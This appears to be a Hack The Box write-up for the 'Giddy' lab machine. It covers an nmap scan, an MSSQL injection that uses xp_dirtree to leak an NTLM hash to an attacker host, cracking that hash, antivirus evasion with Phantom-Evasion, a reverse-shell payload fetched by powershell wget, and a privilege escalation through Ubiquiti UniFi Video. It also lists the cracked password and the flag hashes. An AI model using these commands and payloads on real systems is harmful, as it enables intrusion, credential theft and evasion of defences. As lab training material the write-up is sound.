---
layout: post
title:  "HTB Giddy"
tags: introduction tutorial
---
# Recon
1. Nmap scan
```shell
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Exploitatio Method 1 MSF
1. Microsoft SQL Server SQLi NTLM Stealer
```shell
use auxiliary/admin/mssql/mssql_ntlm_stealer_sqli
```
2. SMB CAPTURE MODULE
```shell
use auxiliary/server/capture/smb
```
3. USE JOHN TO CRACK THE HASHED PASSWORDS IN FORMAT:netntlmv2
```shell
Stacy : xNnWo6272k7x 
```

# Exploitation Method 2 SQL Injection and BURPSUITE
1. Start Burpsuite and have it ready to intercept
2. On the search field of the website, search for any item from the database and add two dashes.
> caps--

3.  Modified the search-term "cap--" to: 
```shell
' EXEC master.sys.xp_dirtree'\\10.10.14.34\share--
```
4. and we forward the request

5. Start Responder with the -I tun0 option to set up a smbserver to capture NetNTLM hash

6. Use John to crack teh hash
```shell
Stacy : xNnWo6272k7x 
```

# Privilege Escalation Ubiquiti and Phantom evasion
1. An program installed called Ubiquiti Unifi Video is vulnerable to local priv-esc CVE-2016-6914
2. We create a msfvenom shell and uploaded to the target machine.
```shell
powershell wget "http://10.10.14.14/taskkill.exe" -outfile "taskkill.exe" 
```
3. However antivirus detects our malicius shell and blocks its execution.
4. We download and install Phantom-evasion
```shell
https://github.com/oddcod3/Phantom-Evasion
```
5. We set the parameters with a windows 64 reverse shell and create and transfer "taskkill.exe to our target machine
```shell
powershell wget "http://10.10.14.14/taskkill.exe" -outfile "taskkill.exe" 
```
6. We proceed to set up multi/handler to catch out shell with a 64 windows payload
7. We type Stop-Service "Ubiquiti Unifi Video" to shutdown the program
8. Then we use Start-Service Ubiquiti Unifi Video" to restart the program
9. Finally we obtain a "NT Authority\system" shell

|Flags| Hash|
|----|-----|
|Root | CF559C6C121F683BF3E56891E80641B1 |
|User|10C1C275385280605E96ADD808C1A0AD |
